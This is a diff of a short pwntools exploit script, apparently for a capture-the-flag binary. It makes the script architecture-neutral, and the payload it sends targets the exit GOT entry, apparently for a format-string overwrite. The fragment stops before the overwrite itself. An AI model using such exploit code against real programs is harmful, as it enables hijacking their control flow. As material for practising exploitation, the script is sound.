@@ -1,11 +1,10 @@
 from pwn import *
 
-context.clear(arch='amd64')
-
 e = ELF('prog')
+context.clear(arch=e.arch, endian=e.endian)
 
 p = e.process()
-p.sendline('a'*4+p64(e.got.exit))
+p.sendline('a'*4+pack(e.got.exit))
 
 where = 7
 many = e.sym.format - e.sym.input
